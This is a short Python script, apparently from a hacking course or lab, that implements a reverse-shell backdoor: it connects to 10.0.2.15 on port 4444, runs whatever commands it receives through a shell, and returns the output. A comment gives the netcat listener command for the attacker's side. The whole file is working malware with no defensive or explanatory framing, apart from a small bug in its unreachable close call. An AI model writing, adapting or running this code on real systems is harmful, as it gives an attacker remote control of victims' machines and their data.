#!/usr/bin/env python

import socket, subprocess, time

class Backdoor:
	def __init__(self, ip, port):
		# nc -vv -l -p 4444
		# establish connection
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))	# tuple

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

# time.sleep(10)
	def run(self):
		while True:
			command = self.connection.recv(1024) # batch 1024bytes
			command_result = self.execute_system_command(command) # whoami
			self.connection.send(command_result)
		connection.close()
		
my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()
